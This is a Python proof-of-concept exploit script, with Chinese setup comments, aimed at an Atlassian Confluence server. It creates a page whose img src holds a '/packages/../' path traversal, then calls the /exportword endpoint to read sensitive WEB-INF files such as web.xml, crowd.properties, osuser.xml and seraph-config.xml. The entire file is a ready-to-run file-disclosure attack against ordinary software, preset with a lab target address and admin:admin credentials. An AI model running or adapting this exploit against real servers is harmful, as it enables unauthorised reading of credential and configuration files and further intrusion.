#coding=utf-8

import requests
import json,base64,random
import string

'''
1.无法访问，请修改本机ip地址为192.168.233.0/24段内。
2.修改SPACE_KEY，创建的空间名称。
'''

URL_BASE = 'http://192.168.233.133:8090'    # edit your target url here

# user credentials
USER = 'admin'
PASS = 'admin'

# the space that you have permission to create a page on
SPACE_KEY = "test"
# or you can use this REST api /rest/api/space to create a space and get spaceKey

# random title name
TITLE = ''.join([random.choice(string.ascii_letters) for i in range(6)])

# payload prefix
PRE = '/packages/../'

# sensitive files located at `confluence/WEB-INF/`
sensitive_files = [
    'web.xml',
    'classes/atlassian-user.xml',
    'classes/osuser.xml',
    'classes/atlassianUserContext.xml',
    'classes/upgradeSubsystemContext.xml',
    'classes/crowd.properties',
    'classes/confluence-init.properties',
    'classes/seraph-config.xml',
]

# change the index when you switch payload
payload = PRE + sensitive_files[0]

def auth(p_name, p_pass):
    name = p_name
    password = p_pass
    tmp = name + ':' + password
    auth = base64.b64encode(tmp)
    headers = {
            'X-Atlassian-Token': 'no-check',
            'Authorization': 'Basic'+' '+auth,
            }
    return headers


session = requests.Session()

url1 = URL_BASE + '/rest/api/content/'

json_payload = {
  "type": "page",
  "space": {
    "key": "{0}".format(SPACE_KEY)
  },
  "title": "{0}".format(TITLE),
  "body": {
    "storage": {
      "value": "<p><img  src=\"{0}\" /></p>".format(payload),
      "representation": "storage"
    }
  }
}


print("[*] Payload: " + str(json_payload))

def poc(p_user, p_pass):
    headers = auth(p_user, p_pass)
    r = session.post(url1, headers=headers, json=json_payload)
    if r.status_code == 200:
        # extract space id value from response json
        id = r.json()['id']
        return id
       
print("[*] username/password: " + USER + ":" + PASS)
print("[*] space name: " + SPACE_KEY)
print("[*] page title name: " + TITLE)

page_id = poc(USER, PASS)
print("[*] pageId: " + page_id)

url2 = URL_BASE + '/exportword?pageId=' + page_id
content = session.get(url2).content
print(content)